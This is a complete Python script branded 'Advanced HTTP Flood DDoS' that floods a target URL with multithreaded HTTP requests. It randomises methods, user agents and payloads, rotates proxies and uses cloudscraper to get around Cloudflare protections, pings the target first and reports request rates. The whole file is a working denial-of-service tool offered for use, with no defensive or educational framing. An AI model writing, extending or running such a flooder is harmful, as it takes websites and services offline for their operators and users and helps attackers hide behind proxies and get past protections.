#!/usr/bin/env python3

import requests
import time
import argparse
import threading
import logging
import random
import json
from colorama import init, Fore, Style
from dns import resolver
from base64 import b64encode
from itertools import cycle
from cloudscraper import create_scraper
import os
import subprocess

# Initialize colorama
init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL

# Global variables
requests_sent = 0
successful_requests = 0
failed_requests = 0
last_time = time.time()
requests_lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
]

HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

# Functions
def display_banner():
    print(f"""{BLUE}
    ##################################################
    #                                                #
    #                    DDoS                        #
    #          Advanced HTTP Flood DDoS              #
    #                                                #
    {YELLOW}#        Created by MIDO                 #
    {BLUE}#                                          #
    ##################################################
    {RESET}""")

def load_proxies(proxy_file):
    try:
        with open(proxy_file, "r") as f:
            proxy_list = f.read().splitlines()
        return [p for p in proxy_list if p.strip()]
    except FileNotFoundError:
        logging.error(f"Proxy file '{proxy_file}' not found.")
        return []

def resolve_target(target_url):
    try:
        domain = target_url.split("//")[-1].split("/")[0]
        ip = resolver.resolve(domain, "A")[0].to_text()
        logging.info(f"Resolved {domain} to IP: {ip}")
        return ip
    except Exception as e:
        logging.error(f"Failed to resolve domain: {e}")
        return None

def check_target_reachable(ip):
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "2", ip], capture_output=True, text=True)
        if result.returncode == 0:
            logging.info("Target is reachable (Ping successful).")
            return True
        else:
            logging.error("Target is unreachable (Ping failed).")
            return False
    except Exception as e:
        logging.error(f"Ping check failed: {e}")
        return False

def generate_payload():
    return b64encode(os.urandom(64)).decode()

def attack(target_url, stop_event, pause_time, proxies=None):
    global requests_sent, successful_requests, failed_requests, last_time
    scraper = create_scraper()
    proxy_pool = cycle(proxies) if proxies else None

    while not stop_event.is_set():
        try:
            headers = {"User-Agent": random.choice(USER_AGENTS)}
            method = random.choice(HTTP_METHODS)

            if method in ["POST", "PUT", "PATCH"]:
                data = {"data": generate_payload()}
            else:
                data = None

            proxy = {"http": next(proxy_pool)} if proxy_pool else None

            response = scraper.request(
                method, target_url, headers=headers, proxies=proxy, timeout=5, data=data
            )

            with requests_lock:
                requests_sent += 1
                last_time = time.time()
                if response.status_code in [200, 201, 204]:
                    successful_requests += 1
                else:
                    failed_requests += 1

        except requests.RequestException as e:
            with requests_lock:
                failed_requests += 1
            logging.error(f"Request failed: {e}")

        time.sleep(pause_time)

def display_status(stop_event, duration):
    start_time = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        with requests_lock:
            current_time = time.time()
            rps = requests_sent / max(1, current_time - start_time)
            print(
                f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f}{RESET}"
            )
        time.sleep(1)

def parse_args():
    parser = argparse.ArgumentParser(description="Advanced DDoS by Mido")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
    parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration (seconds)")
    parser.add_argument("--proxies", help="File containing proxy list")
    parser.add_argument("-l", "--logfile", default="attack.log", help="Log file")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    return parser.parse_args()

def setup_logging(logfile, verbose):
    logging.basicConfig(
        filename=logfile,
        level=logging.DEBUG if verbose else logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
    )

def main():
    args = parse_args()

    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        exit(1)

    setup_logging(args.logfile, args.verbose)
    display_banner()

    proxies = load_proxies(args.proxies) if args.proxies else []
    target_ip = args.url.split("//")[-1].split("/")[0]  # Extract IP or hostname from URL

    if not check_target_reachable(target_ip):
        print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(1)

    stop_event = threading.Event()
    threads = []

    for _ in range(args.threads):
        t = threading.Thread(target=attack, args=(args.url, stop_event, args.pause, proxies))
        t.daemon = True
        threads.append(t)
        t.start()

    display_thread = threading.Thread(target=display_status, args=(stop_event, args.duration))
    display_thread.daemon = True
    display_thread.start()

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"{RED}Interrupted by user.")
    finally:
        stop_event.set()

    for t in threads:
        t.join()

    with requests_lock:
        rps = requests_sent / max(1, time.time() - (time.time() - args.duration))
        print(f"{GREEN}Attack completed. Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | Final RPS: {rps:.2f}{RESET}")
        logging.info(f"Attack finished. Total Requests Sent: {requests_sent}, Successful: {successful_requests}, Failed: {failed_requests}, Final RPS: {rps:.2f}")

if __name__ == "__main__":
    main()
